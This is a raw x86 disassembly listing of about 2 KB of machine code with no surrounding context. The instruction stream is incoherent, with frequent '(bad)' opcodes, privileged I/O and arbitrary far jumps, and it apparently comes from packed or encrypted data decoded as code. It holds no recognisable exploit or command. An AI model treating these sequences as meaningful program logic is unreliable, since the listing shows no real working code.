  40913b:	jmp    0x4090d9
  40913d:	pop    ecx
  40913e:	imul   ebx,DWORD PTR [edi-0x49],0x72
  409142:	and    al,0xd1
  409144:	inc    edx
  409145:	mov    WORD PTR fs:[edi],fs
  409148:	fwait
  409149:	mov    dl,0x69
  40914b:	mov    al,ds:0xfc4bed0c
  409150:	xchg   ebp,eax
  409151:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409152:	sbb    dl,0x80
  409155:	test   al,0x6a
  409157:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409158:	enter  0xb062,0xbe
  40915c:	test   edx,0x2422172d
  409162:	aam    0x9
  409164:	pop    es
  409165:	jae    0x4091ad
  409167:	sbb    eax,0xb4099f18
  40916c:	rcl    DWORD PTR [ebx-0x67],1
  40916f:	jns    0x409105
  409171:	adc    ch,BYTE PTR [edx+0x66]
  409174:	dec    ebp
  409175:	xchg   esi,eax
  409176:	stos   DWORD PTR es:[edi],eax
  409177:	cld    
  409178:	and    ebx,DWORD PTR [eax]
  40917a:	aad    0x40
  40917c:	mov    eax,ds:0x4830be00
  409181:	cs dec ebp
  409183:	bound  esi,QWORD PTR [edi-0x2e032616]
  409189:	push   es
  40918a:	sub    DWORD PTR [ecx],ecx
  40918c:	(bad)  
  40918d:	call   FWORD PTR [eax+eiz*8]
  409190:	adc    al,0xbc
  409192:	cmp    al,0xec
  409194:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409195:	jp     0x4091e0
  409197:	mov    al,ds:0x9dc6d3f0
  40919c:	add    eax,0x1b84a5d8
  4091a1:	mov    WORD PTR [esi-0x61],fs
  4091a4:	aad    0x74
  4091a6:	ds adc al,0xae
  4091a9:	jg     0x4091de
  4091ab:	pop    esp
  4091ac:	jnp    0x409170
  4091ae:	jl     0x4091f8
  4091b0:	sti    
  4091b1:	je     0x409179
  4091b3:	push   ss
  4091b4:	test   eax,0x10ed5751
  4091b9:	mov    ecx,0xa25604f7
  4091be:	push   0xf8cd6868
  4091c3:	aas    
  4091c4:	and    al,0x78
  4091c6:	sub    BYTE PTR [ebx+0x68],0xfe
  4091ca:	dec    ecx
  4091cb:	arpl   WORD PTR [edx+0x5],dx
  4091ce:	sub    edx,ecx
  4091d0:	out    dx,al
  4091d1:	shl    BYTE PTR [edx+0x2e],1
  4091d4:	sbb    eax,DWORD PTR [edi]
  4091d6:	outs   dx,DWORD PTR ds:[esi]
  4091d7:	outs   dx,BYTE PTR ds:[esi]
  4091d8:	in     al,0x5d
  4091da:	lock cmp eax,0xba94e838
  4091e0:	pop    esi
  4091e1:	xchg   esi,eax
  4091e2:	mov    esi,0x7215830f
  4091e7:	das    
  4091e8:	sub    eax,edi
  4091ea:	and    DWORD PTR [ecx-0x12],esi
  4091ed:	(bad)  
  4091ee:	sub    DWORD PTR [ecx],ecx
  4091f0:	stos   DWORD PTR es:[edi],eax
  4091f1:	sub    ecx,eax
  4091f3:	inc    eax
  4091f4:	dec    ecx
  4091f5:	enter  0xd393,0xc7
  4091f9:	fimul  DWORD PTR [ebp+0x39]
  4091fc:	push   ss
  4091fd:	loopne 0x40924b
  4091ff:	repnz xchg esi,eax
  409201:	sub    eax,0x8fef287c
  409206:	ins    DWORD PTR es:[edi],dx
  409207:	sahf   
  409208:	push   esp
  409209:	test   ch,al
  40920b:	clc    
  40920c:	or     dh,BYTE PTR [ebp+0x3ffc6196]
  409212:	or     eax,DWORD PTR [ebx+edi*2]
  409215:	cdq    
  409216:	les    ebp,FWORD PTR [ebp+0x79796c32]
  40921c:	sbb    eax,0x13d4d2ea
  409221:	cld    
  409222:	out    0x39,eax
  409224:	dec    esp
  409225:	test   eax,0x2c490de6
  40922a:	(bad)  
  40922b:	mul    BYTE PTR [eax+0x5c]
  40922e:	mov    eax,0xd7266907
  409233:	int    0xa8
  409235:	adc    esi,ebp
  409237:	adc    dl,BYTE PTR [ebx+0xd96dcaa]
  40923d:	cs mov cl,0x37
  409240:	mov    eax,ds:0xd6a72ead
  409245:	pop    ebx
  409246:	and    BYTE PTR [edx-0x44],dh
  409249:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40924a:	cmp    BYTE PTR [eax],ch
  40924c:	in     al,dx
  40924d:	inc    ebp
  40924e:	(bad)  
  409250:	mov    bh,0xb6
  409252:	cmp    al,0x21
  409254:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409256:	fsub   DWORD PTR [ecx-0x4de16046]
  40925c:	ret    
  40925d:	imul   edi,DWORD PTR [ebx+0x36449b22],0xdf81340f
  409267:	adc    ebx,esp
  409269:	mov    ds:0x59c25a31,al
  40926e:	and    BYTE PTR [edi-0x2d480df4],al
  409274:	or     al,BYTE PTR [ebx-0x1a]
  409277:	shl    DWORD PTR [ebx-0xecaf189],cl
  40927d:	ds pushf 
  40927f:	lahf   
  409280:	jae    0x409296
  409282:	(bad)  
  409283:	in     eax,dx
  409284:	add    ebp,DWORD PTR [esi-0x2714f0c5]
  40928a:	popf   
  40928b:	mov    ebx,DWORD PTR ds:[edi-0x3a]
  40928f:	pop    ebp
  409290:	push   0x1337f678
  409295:	xor    eax,0x82c17807
  40929a:	test   BYTE PTR [edi-0x13],ch
  40929d:	fisttp WORD PTR [ebx-0x2]
  4092a0:	imul   eax,DWORD PTR [esi],0x190dba0e
  4092a6:	out    0x89,eax
  4092a8:	cmp    esi,ebx
  4092aa:	ror    BYTE PTR [edx+0x5d],cl
  4092ad:	jecxz  0x409310
  4092af:	xchg   ecx,eax
  4092b0:	cld    
  4092b1:	add    edx,edx
  4092b3:	sbb    eax,edx
  4092b5:	push   ecx
  4092b6:	les    edx,FWORD PTR [ebp+0x2f72fb30]
  4092bc:	bound  eax,QWORD PTR [edx+0x57785bcc]
  4092c2:	nop
  4092c3:	adc    DWORD PTR [edi],ecx
  4092c5:	push   edi
  4092c6:	js     0x409328
  4092c8:	(bad)  
  4092c9:	adc    al,BYTE PTR [ebp+0x2da2db6c]
  4092cf:	call   0xe567909c
  4092d4:	lods   al,BYTE PTR ds:[esi]
  4092d5:	push   cs
  4092d6:	push   0x75caaf1a
  4092db:	and    esi,DWORD PTR [ecx+ebp*1-0x44]
  4092df:	scas   eax,DWORD PTR es:[edi]
  4092e0:	sbb    eax,0x55810e4f
  4092e5:	xor    BYTE PTR [ebx-0x51618c55],bh
  4092eb:	xchg   dl,cl
  4092ed:	ins    DWORD PTR es:[edi],dx
  4092ee:	inc    DWORD PTR [ecx-0x1b03c08b]
  4092f4:	mov    eax,ds:0xaa11734
  4092f9:	add    al,0xce
  4092fb:	and    edi,DWORD PTR [ebp-0x338f94e6]
  409301:	lahf   
  409302:	fild   DWORD PTR [edx-0x3f]
  409305:	mov    gs,WORD PTR [edx+0xec1163d]
  40930b:	sbb    bh,dh
  40930d:	or     esp,eax
  40930f:	xor    cl,dl
  409311:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409312:	in     eax,0x26
  409314:	jne    0x409384
  409316:	test   bl,dh
  409318:	mov    eax,0x479a3c2
  40931d:	jb     0x4092ae
  40931f:	mov    esp,0x37df1e71
  409324:	mov    ecx,0x2ad04bb4
  409329:	pop    ecx
  40932a:	sbb    al,0xf2
  40932c:	sub    eax,0x1a59c33f
  409331:	pop    ebp
  409332:	pop    ss
  409333:	in     eax,0x76
  409335:	adc    DWORD PTR [eax],edx
  409337:	mov    dh,0xc6
  409339:	jl     0x409308
  40933b:	sub    bh,BYTE PTR [esi+0x1]
  40933e:	jns    0x40930f
  409340:	add    bh,bh
  409342:	sub    BYTE PTR [edx+esi*4],ch
  409345:	xchg   BYTE PTR [eax+0x67d616f5],dh
  40934b:	call   0x47a3be0
  409350:	mov    al,0x6c
  409352:	push   ebp
  409353:	xor    eax,0x8fd80dcb
  409358:	aam    0x4d
  40935a:	data16 jno 0x40935b
  40935d:	cmp    edi,ebp
  40935f:	nop
  409360:	mov    DWORD PTR [eax+0x409495f0],0xd820d208
  40936a:	lods   eax,DWORD PTR ds:[esi]
  40936b:	leave  
  40936c:	dec    ecx
  40936d:	invd   
  40936f:	lock mov DWORD PTR [edi+0x6e151301],ebp
  409376:	sbb    al,0xfe
  409378:	ja     0x409309
  40937a:	jno    0x40937c
  40937c:	lock and bh,BYTE PTR [edi]
  40937f:	ret    0x547b
  409382:	add    eax,0x1d708a12
  409387:	sbb    eax,0x731d9fa2
  40938c:	call   0x7c70aee5
  409391:	test   al,bh
  409393:	adc    al,0x2d
  409395:	rol    cl,1
  409397:	xchg   ebx,eax
  409398:	icebp  
  409399:	leave  
  40939a:	push   ebp
  40939b:	aam    0x31
  40939d:	sahf   
  40939e:	mov    dh,0x4e
  4093a0:	bound  eax,QWORD PTR [ebx]
  4093a2:	xchg   edi,eax
  4093a3:	mov    ebx,0xaabf2708
  4093a8:	jno    0x409353
  4093aa:	(bad)  
  4093ab:	sbb    al,0x41
  4093ad:	lods   al,BYTE PTR ds:[esi]
  4093ae:	repz mov bl,BYTE PTR [edx+0x8]
  4093b2:	sub    ecx,DWORD PTR [esi-0x6e]
  4093b5:	jl     0x409370
  4093b7:	fidiv  DWORD PTR [edi-0x68]
  4093ba:	ret    
  4093bb:	and    ebx,DWORD PTR [eax+eiz*8]
  4093be:	loope  0x4093d7
  4093c0:	arpl   sp,si
  4093c2:	mov    ebp,0x2f12a99a
  4093c7:	sub    al,0x44
  4093c9:	mov    dl,0xc1
  4093cb:	mov    ebp,0x4e421401
  4093d0:	repnz fidivr WORD PTR es:[ecx-0xd]
  4093d5:	mov    ecx,0x43a128b3
  4093da:	not    BYTE PTR [edi+ecx*8-0x1e3e8e5c]
  4093e1:	sub    DWORD PTR [edx],ebp
  4093e3:	(bad)  [ecx]
  4093e5:	out    dx,al
  4093e6:	jge    0x409392
  4093e8:	jg     0x409463
  4093ea:	(bad)  
  4093eb:	jp     0x409457
  4093ed:	inc    ebx
  4093ee:	pop    eax
  4093ef:	cmp    BYTE PTR [ebx-0x560033de],dl
  4093f5:	sub    esi,ebp
  4093f7:	nop
  4093f8:	xor    esp,DWORD PTR [edx]
  4093fa:	in     eax,0x95
  4093fc:	(bad)  [edi+ebx*1]
  4093ff:	fnstsw WORD PTR [eax+0x24671605]
  409405:	iret   
  409406:	inc    BYTE PTR [eax]
  409408:	dec    ebp
  409409:	push   eax
  40940a:	daa    
  40940b:	sti    
  40940c:	mov    ch,0x17
  40940e:	fisub  DWORD PTR [eax+0x57]
  409411:	mov    edi,0x66905572
  409416:	xlat   BYTE PTR ds:[ebx]
  409417:	mov    cl,0x3a
  409419:	ins    DWORD PTR es:[edi],dx
  40941a:	xchg   DWORD PTR [esi*4+0x6287ba56],edi
  409421:	stos   BYTE PTR es:[edi],al
  409422:	jnp    0x4093d2
  409424:	cmp    DWORD PTR [eax-0x76],eax
  409427:	cmc    
  409428:	scas   eax,DWORD PTR es:[edi]
  409429:	dec    ecx
  40942a:	xor    BYTE PTR [edi],0xd2
  40942d:	fs push ss
  40942f:	stos   BYTE PTR es:[edi],al
  409430:	dec    esi
  409431:	jbe    0x40941c
  409433:	jge    0x4093de
  409435:	stos   DWORD PTR es:[edi],eax
  409436:	sbb    ecx,DWORD PTR [ecx]
  409438:	sbb    BYTE PTR [esi],cl
  40943a:	or     al,0xf8
  40943c:	stos   BYTE PTR es:[edi],al
  40943d:	xor    ch,cl
  40943f:	push   0x53c7acff
  409444:	push   ecx
  409445:	fbld   TBYTE PTR [edx+0xa]
  409448:	jge    0x409469
  40944a:	add    ah,BYTE PTR [edx+0x14]
  40944d:	loope  0x409439
  40944f:	xchg   edx,eax
  409450:	mov    ah,0xb8
  409452:	pop    eax
  409453:	in     eax,dx
  409454:	push   esp
  409455:	inc    eax
  409456:	std    
  409457:	xor    al,BYTE PTR ds:0x6e57c78
  40945d:	call   0x44ad:0x63ee4dc
  409464:	xchg   ecx,eax
  409465:	lods   eax,DWORD PTR ds:[esi]
  409466:	add    cl,bl
  409468:	mov    al,ds:0xc3de73e0
  40946d:	data16 fdivrp st(4),st
  409470:	popf   
  409471:	jo     0x409492
  409473:	lock sbb ebp,DWORD PTR [ebx]
  409476:	iret   
  409477:	fwait
  409478:	out    dx,eax
  409479:	test   DWORD PTR [ebx],edi
  40947b:	sbb    al,0x7a
  40947d:	jne    0x409426
  40947f:	jg     0x4094c0
  409481:	sub    DWORD PTR [edx+0x7],esp
  409484:	adc    ah,dl
  409486:	retf   
  409487:	in     al,dx
  409488:	loop   0x4094fe
  40948a:	ja     0x409497
  40948c:	fld    TBYTE PTR [edi+0x6]
  40948f:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  409491:	inc    ebp
  409492:	jne    0x40947d
  409494:	add    ch,ch
  409496:	mov    bl,0xf0
  409498:	cdq    
  409499:	sti    
  40949a:	call   0x1713:0x90a624b
  4094a1:	sub    edi,eax
  4094a3:	inc    edx
  4094a4:	out    dx,al
  4094a5:	loope  0x4094f8
  4094a7:	pop    ds
  4094a8:	cwde   
  4094a9:	cmc    
  4094aa:	lahf   
  4094ab:	retf   
  4094ac:	cmp    bl,al
  4094ae:	xchg   BYTE PTR [esi+0x23d3d801],al
  4094b4:	and    BYTE PTR [eax-0x53],al
  4094b7:	repz xor BYTE PTR [eax-0x1dc96ce1],bh
  4094be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4094bf:	pop    esi
  4094c0:	mov    ds:0xc04efa4c,eax
  4094c5:	test   DWORD PTR [edi],edi
  4094c7:	scas   al,BYTE PTR es:[edi]
  4094c8:	dec    esp
  4094c9:	int3   
  4094ca:	add    eax,0x558b5518
  4094cf:	stos   BYTE PTR es:[di],al
  4094d1:	lods   eax,DWORD PTR ds:[esi]
  4094d2:	clc    
  4094d3:	(bad)  
  4094d4:	sub    bl,BYTE PTR [esi+edx*4+0x3bbe7c5b]
  4094db:	mov    dl,0x7d
  4094dd:	sbb    DWORD PTR [esi-0x34],eax
  4094e0:	or     eax,0xba9e5ff8
  4094e5:	cmp    DWORD PTR [ebx+0x24],0xe8f7368c
  4094ec:	add    ecx,0xffffffad
  4094ef:	push   esi
  4094f0:	pop    esi
  4094f1:	pushf  
  4094f2:	mov    al,0x70
  4094f4:	cmp    dh,dh
  4094f6:	xchg   ecx,eax
  4094f7:	into   
  4094f8:	mov    WORD PTR [ecx],es
  4094fa:	pushf  
  4094fb:	cmp    al,0xd4
  4094fd:	lods   eax,DWORD PTR ds:[esi]
  4094fe:	jae    0x409550
  409500:	jne    0x40953b
  409502:	lock xchg DWORD PTR [esi+esi*8-0x562955d4],ecx
  40950a:	inc    eax
  40950b:	je     0x409493
  40950d:	inc    edi
  40950e:	imul   ebx,DWORD PTR [ebx-0x7f],0x54
  409512:	cli    
  409513:	jg     0x40951f
  409515:	jp     0x409521
  409517:	pop    esp
  409518:	out    0xdd,al
  40951a:	xchg   ecx,eax
  40951b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40951c:	jnp    0x409533
  40951e:	push   cs
  40951f:	pop    ds
  409520:	add    eax,0x9b2d77af
  409525:	cmp    al,0xde
  409527:	cmc    
  409528:	shr    DWORD PTR [ecx],0x97
  40952b:	int    0xf
  40952d:	adc    ah,BYTE PTR [edx-0x3c]
  409530:	sbb    eax,0x88e59d96
  409535:	mov    ebp,0xd5c70677
  40953a:	fs (bad) 
  40953c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40953d:	ins    BYTE PTR es:[edi],dx
  40953e:	popa   
  40953f:	pop    ecx
  409540:	idiv   BYTE PTR [edi+0x5424c9f7]
  409546:	stos   DWORD PTR es:[edi],eax
  409547:	mov    ds:0x6c84d3d8,eax
  40954c:	pop    es
  40954d:	mov    cl,0x52
  40954f:	push   es
  409550:	call   0x3ad98122
  409555:	sub    eax,0x7ab3c238
  40955a:	inc    ebx
  40955b:	mov    ds,WORD PTR [esi+0x4b]
  40955e:	jge    0x4095aa
  409560:	dec    edx
  409561:	jmp    0x4095d0
  409563:	add    bl,BYTE PTR [esi+0x28]
  409566:	out    0xc,eax
  409568:	inc    esi
  409569:	sub    DWORD PTR [edi+edi*4-0x25a295af],ecx
  409570:	cli    
  409571:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409572:	mov    cl,0x79
  409574:	cdq    
  409575:	in     al,dx
  409576:	add    BYTE PTR [edi],cl
  409578:	xor    eax,0x7ff69375
  40957d:	dec    esi
  40957e:	shr    ch,0x17
  409581:	mov    ebp,0x7ce85518
  409586:	mov    ecx,0x6d04f90e
  40958b:	lods   eax,DWORD PTR ds:[esi]
  40958c:	das    
  40958d:	mov    ds,WORD PTR [ebx]
  40958f:	and    al,0x26
  409591:	mov    ds:0xa79c0b40,eax
  409596:	inc    edi
  409597:	and    dl,bh
  409599:	arpl   WORD PTR [ecx-0x30242a0d],ax
  40959f:	fistp  WORD PTR [edi+0x5e]
  4095a2:	jg     0x409620
  4095a4:	push   ds
  4095a5:	mov    al,bl
  4095a7:	cwde   
  4095a8:	and    BYTE PTR [eax+eiz*2-0x61],cl
  4095ac:	and    ebx,ebx
  4095ae:	aam    0x25
  4095b0:	adc    ecx,DWORD PTR ds:0x2fa03133
  4095b6:	jns    0x4095db
  4095b8:	int    0xb2
  4095ba:	nop
  4095bb:	enter  0x15d0,0x78
  4095bf:	mov    al,0x3d
  4095c1:	adc    al,0x7
  4095c3:	inc    eax
  4095c4:	imul   esi,DWORD PTR [ecx-0x5b],0xf0ab0346
  4095cb:	pop    es
  4095cc:	or     eax,0x39c6fd45
  4095d1:	les    eax,FWORD PTR [edi-0x19]
  4095d4:	cli    
  4095d5:	mov    bh,0x21
  4095d7:	(bad)  
  4095d9:	adc    eax,0x3cca72d5
  4095de:	ins    DWORD PTR es:[edi],dx
  4095df:	and    bh,BYTE PTR [ecx+0xc]
  4095e2:	lea    edi,[ecx-0x7d]
  4095e5:	add    al,BYTE PTR [esi+0x3df16c60]
  4095eb:	jmp    0x40959a
  4095ed:	push   ebp
  4095ee:	aas    
  4095ef:	adc    esp,ebp
  4095f1:	scas   eax,DWORD PTR es:[edi]
  4095f2:	ror    BYTE PTR [ecx-0x2c],0xdd
  4095f6:	in     al,0x13
  4095f8:	jl     0x4095b1
  4095fa:	dec    esi
  4095fb:	lea    edi,[edx]
  4095fd:	lahf   
  4095fe:	dec    ecx
  4095ff:	enter  0xf6b,0x3e
  409603:	mov    bl,0xd1
  409605:	fadd   QWORD PTR [esi+0xcb6342e]
  40960b:	add    edx,ecx
  40960d:	int    0x4d
  40960f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409610:	ins    DWORD PTR es:[edi],dx
  409611:	mov    ds:0x2267dae6,al
  409616:	push   0xffffffc9
  409618:	out    dx,al
  409619:	jle    0x409679
  40961b:	jmp    FWORD PTR [esp+esi*4-0x46e4ed96]
  409622:	shr    BYTE PTR [edx+0x7d],1
  409625:	mov    ds:0x200972df,al
  40962a:	nop
  40962b:	hlt    
  40962c:	(bad)  
  40962d:	mul    BYTE PTR [ebx]
  40962f:	push   ds
  409630:	cmp    dh,0x35
  409633:	mov    cl,ch
  409635:	and    eax,0xba196f55
  40963a:	(bad)  
  40963b:	inc    BYTE PTR [edx+0x562c8cd4]
  409641:	loop   0x409637
  409643:	pop    ss
  409644:	mov    edx,0x3bcd162a
  409649:	add    dl,al
  40964b:	cmp    ch,BYTE PTR [ecx+0x5df4fdf]
  409651:	test   DWORD PTR [esi-0x60],edx
  409654:	xor    DWORD PTR [edi],ebx
  409656:	mov    ebx,0x333c413e
  40965b:	jle    0x40962b
  40965d:	shl    BYTE PTR [ebp-0x55],0xd0
  409661:	cmp    DWORD PTR [ebx],edx
  409663:	jb     0x409600
  409665:	dec    esp
  409666:	les    ebp,FWORD PTR [esi-0x19b7f8e0]
  40966c:	jmp    0xc591:0x2c3069cb
  409673:	bound  edx,QWORD PTR [eax+0x25]
  409676:	fidivr WORD PTR [eax]
  409678:	fadd   QWORD PTR [ebx]
  40967a:	mov    ds:0x8ada054b,eax
  40967f:	pop    edi
  409680:	jne    0x40969b
  409682:	mov    bl,0x3d
  409684:	sbb    BYTE PTR [ebp+0x17],0x94
  409688:	and    cl,BYTE PTR [edx]
  40968a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40968b:	jge    0x4096df
  40968d:	js     0x409634
  40968f:	sar    al,1
  409691:	mov    ecx,0x7db02cb2
  409696:	pop    esp
  409697:	addr16 jno 0x4096b7
  40969a:	sahf   
  40969b:	bound  edi,QWORD PTR [ecx+0x3d0ab8d0]
  4096a1:	pop    esp
  4096a2:	jmp    0x4172:0x708fb743
  4096a9:	fcom   QWORD PTR [edi]
  4096ab:	mov    eax,0x3c1170a5
  4096b0:	mov    ecx,0xc074a1a0
  4096b5:	jne    0x4096d4
  4096b7:	out    0xf5,al
  4096b9:	cli    
  4096ba:	ss pop ss
  4096bc:	test   DWORD PTR [ecx],0x240c3ef3
  4096c2:	test   eax,0x797c3a8c
  4096c7:	enter  0x7a35,0x1b
  4096cb:	sti    
  4096cc:	pop    esi
  4096cd:	sbb    al,0xb8
  4096cf:	pop    edi
  4096d0:	mov    ah,0xeb
  4096d2:	sub    dl,BYTE PTR [eax+0x52f5d8fe]
  4096d8:	cmp    bl,BYTE PTR [edx-0x4c]
  4096db:	pop    edi
  4096dc:	bound  ecx,QWORD PTR [edi+ebx*2+0x37f26828]
  4096e3:	and    ecx,DWORD PTR [ebx-0x74]
  4096e6:	(bad)  
  4096e7:	mov    al,0x7c
  4096e9:	or     al,dh
  4096eb:	xor    DWORD PTR [ecx],esi
  4096ed:	ror    DWORD PTR [ebx-0x9],0x76
  4096f1:	lahf   
  4096f2:	lods   eax,DWORD PTR ds:[esi]
  4096f3:	or     esp,edi
  4096f5:	jmp    0x5629f68a
  4096fa:	pop    esi
  4096fb:	push   es
  4096fc:	sbb    edi,0xf94b302b
  409702:	scas   al,BYTE PTR es:[edi]
  409703:	adc    al,0xc
  409705:	dec    ebx
  409706:	cmp    al,0x80
  409708:	(bad)  
  40970a:	fmul   DWORD PTR [edx]
  40970c:	dec    esi
  40970d:	xor    edi,DWORD PTR [ecx+0x28a3f0ac]
  409713:	scas   eax,DWORD PTR es:[edi]
  409714:	fcomp  DWORD PTR [edi-0x33]
  409717:	add    BYTE PTR [ebx],ch
  409719:	push   esp
  40971a:	(bad)  
  40971b:	ja     0x40976f
  40971d:	mov    ds:0xcc096783,eax
  409722:	retf   0x527
  409725:	pop    ebx
  409726:	out    0x6d,al
  409728:	mov    ah,0xce
  40972a:	or     eax,0xf4f70ba9
  40972f:	add    eax,ecx
  409731:	retf   
  409732:	inc    ebp
  409733:	fcom   QWORD PTR [ebx-0x10cbbcd2]
  409739:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40973a:	add    eax,0x475df3ac
  40973f:	jecxz  0x4097a1
  409741:	jl     0x409724
  409743:	rcr    DWORD PTR [edx],1
  409745:	ss pop ecx
  409747:	outs   dx,BYTE PTR ds:[esi]
  409748:	jp     0x40973d
  40974a:	in     eax,dx
  40974b:	mov    al,ds:0xc9a21cff
  409750:	test   BYTE PTR [eax+0x2d55d682],ch
  409756:	and    al,bh
  409758:	mov    edx,0x16b44a74
  40975d:	aad    0x97
  40975f:	jbe    0x40978a
  409761:	mov    BYTE PTR [eax+0x576a0b99],dh
  409767:	mov    edx,0x6964a686
  40976c:	mov    cl,0x18
  40976e:	loopne 0x4097c0
  409770:	(bad)
  409773:	lods   eax,DWORD PTR ds:[esi]
  409774:	(bad)  
  409775:	jmp    0xb39:0x83419cfa
  40977c:	jmp    0x4d1f:0x79a3b7a
  409783:	and    al,0x20
  409785:	mov    ds:0xeeafa9e9,eax
  40978a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40978b:	or     eax,0x5d382c0c
  409790:	cmp    edi,DWORD PTR [ecx-0x2c]
  409793:	clc    
  409794:	shr    DWORD PTR [edi+0x40],1
  409797:	cli    
  409798:	(bad)  
  409799:	cmp    edx,DWORD PTR [eax]
  40979b:	int    0xa4
  40979d:	sbb    al,0xe9
  40979f:	sub    eax,0xf873b32d
  4097a4:	pop    esi
  4097a5:	in     al,0x7e
  4097a7:	dec    eax
  4097a8:	std    
  4097a9:	inc    ebp
  4097aa:	scas   eax,DWORD PTR es:[edi]
  4097ab:	cmp    al,0x9c
  4097ad:	out    0x3d,eax
  4097af:	imul   ecx,DWORD PTR [edx+0x6f636da2],0x56dcbd6
  4097b9:	ror    BYTE PTR [edx+0x5cb05b5b],cl
  4097bf:	xor    al,0x3e
  4097c1:	mov    esp,DWORD PTR [edx]
  4097c3:	push   ebp
  4097c4:	pop    ebx
  4097c5:	and    al,0x4c
  4097c7:	fld    DWORD PTR [edx]
  4097c9:	sar    BYTE PTR [ebp-0x67],1
  4097cc:	pop    esi
  4097cd:	dec    ebp
  4097ce:	rcr    BYTE PTR [edx],1
  4097d0:	pop    esp
  4097d1:	pop    ebp
  4097d2:	stos   DWORD PTR es:[edi],eax
  4097d3:	mov    DWORD PTR [esi],esi
  4097d5:	addr16 push esp
  4097d7:	test   eax,0xdcb52c32
  4097dc:	nop
  4097dd:	dec    ebx
  4097de:	xor    al,0xc8
  4097e0:	lods   eax,DWORD PTR ds:[esi]
  4097e1:	or     ebp,DWORD PTR [ebp+edx*1+0x7e]
  4097e5:	(bad)  
  4097e6:	cwde   
  4097e7:	pop    ebx
  4097e8:	push   ebx
  4097e9:	rcl    BYTE PTR [edi],0x33
  4097ec:	push   ebx
  4097ed:	jae    0x4097f4
  4097ef:	in     eax,dx
  4097f0:	setle  BYTE PTR fs:[ebx+ecx*2+0x60]
  4097f6:	add    ebp,DWORD PTR [eax-0x60c83731]
  4097fc:	adc    cl,BYTE PTR [edi-0x2df53537]
  409802:	inc    esp
  409803:	push   0x9ddf13ac
  409808:	iret   
  409809:	pop    ds
  40980a:	inc    ebx
  40980b:	aas    
  40980c:	jmp    0xe1ff:0x38ad7baf
  409813:	repz cmp edi,DWORD PTR [edx+0x273fecbc]
  40981a:	(bad)  
  40981b:	jg     0x409813
  40981d:	in     al,dx
  40981e:	add    DWORD PTR [ecx+0x100f6ab2],edx
  409824:	mov    bh,0xfb
  409826:	mov    esi,ecx
  409828:	pop    ecx
  409829:	push   ebp
  40982a:	mov    esp,0xd863b1de
  40982f:	inc    eax
  409830:	dec    ecx
  409831:	pop    ebp
  409832:	retf   
  409833:	and    DWORD PTR [esi+0x1e8123f7],eax
  409839:	sti    
  40983a:	jbe    0x4098bb
  40983c:	test   al,0x3b
  40983e:	xchg   esp,eax
  40983f:	call   0x2bb5:0x53dbcc02
  409846:	mov    dl,bl
  409848:	mov    edx,DWORD PTR [eax+0x74]
  40984b:	and    BYTE PTR [ebp+0x7f],dh
  40984e:	mul    BYTE PTR [ebp+0x4c]
  409851:	or     al,0x6c
  409853:	add    al,0x3f
  409855:	call   0xf3e5:0xc811d317
  40985c:	mov    eax,ds:0xc3cee6dc
  409861:	stos   BYTE PTR es:[edi],al
  409862:	loopne 0x4098c5
  409864:	hlt    
  409865:	mov    al,ds:0x8812225a
  40986a:	sub    BYTE PTR [ecx-0x1b90e574],cl
  409870:	mov    BYTE PTR [edi+0x52d87bf9],ah
  409876:	sbb    esp,DWORD PTR [ecx-0xb]
  409879:	add    al,0x45
  40987b:	lahf   
  40987c:	fcom   QWORD PTR [eax-0xf]
  40987f:	dec    esp
  409880:	or     edi,DWORD PTR [esi]
  409882:	mov    BYTE PTR [ecx],ah
  409884:	mov    bl,0x72
  409886:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409887:	adc    ah,BYTE PTR [esi]
  409889:	and    eax,0x2c8fbf31
  40988e:	cmc    
  40988f:	(bad)  
  409890:	push   esi
  409891:	aaa    
  409892:	mov    dh,0x5c
  409894:	inc    ebx
  409895:	xchg   ebx,eax
  409896:	in     eax,dx
  409897:	ja     0x409888
  409899:	clc    
  40989a:	test   DWORD PTR ds:0xe019972a,ebp
  4098a0:	push   ss
  4098a1:	mov    edi,0xd79ac54d
  4098a6:	mov    al,ds:0xe36e166a
  4098ab:	dec    edi
  4098ac:	pop    ss
  4098ad:	lods   eax,DWORD PTR ds:[esi]
  4098ae:	(bad)  
  4098af:	int3   
  4098b0:	(bad)  
  4098b1:	aad    0x60
  4098b3:	mov    bl,0x96
  4098b5:	xchg   edx,eax
  4098b6:	push   es
  4098b7:	lods   al,BYTE PTR ds:[esi]
  4098b8:	mov    al,0x8e
  4098ba:	fsubr  DWORD PTR [ebx+esi*1]
  4098bd:	adc    esi,DWORD PTR [edx]
  4098bf:	cmp    ah,BYTE PTR [eax]
  4098c1:	push   ss
  4098c2:	sar    BYTE PTR [eax-0x6b002ee7],cl
  4098c8:	push   es
  4098c9:	adc    esi,DWORD PTR [edx]
  4098cb:	xor    ch,cl
  4098cd:	in     eax,0xa9
  4098cf:	lea    eax,[ecx]
  4098d1:	ds jns 0x409896
  4098d4:	or     BYTE PTR [eax+edx*1],0xdc
  4098d8:	cmp    al,0xdf
  4098da:	adc    BYTE PTR [ebx-0x35],al
  4098dd:	js     0x409882
  4098df:	jne    0x40987f
  4098e1:	ret    0x401c
  4098e4:	lods   al,BYTE PTR ds:[esi]
  4098e5:	xchg   ebx,eax
  4098e6:	stc    
  4098e7:	or     bl,BYTE PTR [edx]
  4098e9:	jb     0x4098d5
  4098eb:	xchg   ebp,eax
  4098ec:	cmp    ebp,DWORD PTR [edi-0x5e5ac1ff]
  4098f2:	out    0x99,al
  4098f4:	ins    DWORD PTR es:[edi],dx
  4098f5:	shr    BYTE PTR [edi],1
  4098f7:	and    bl,dl
  4098f9:	loopne 0x409949
  4098fb:	nop
  4098fc:	adc    BYTE PTR [edi-0x17404639],dh
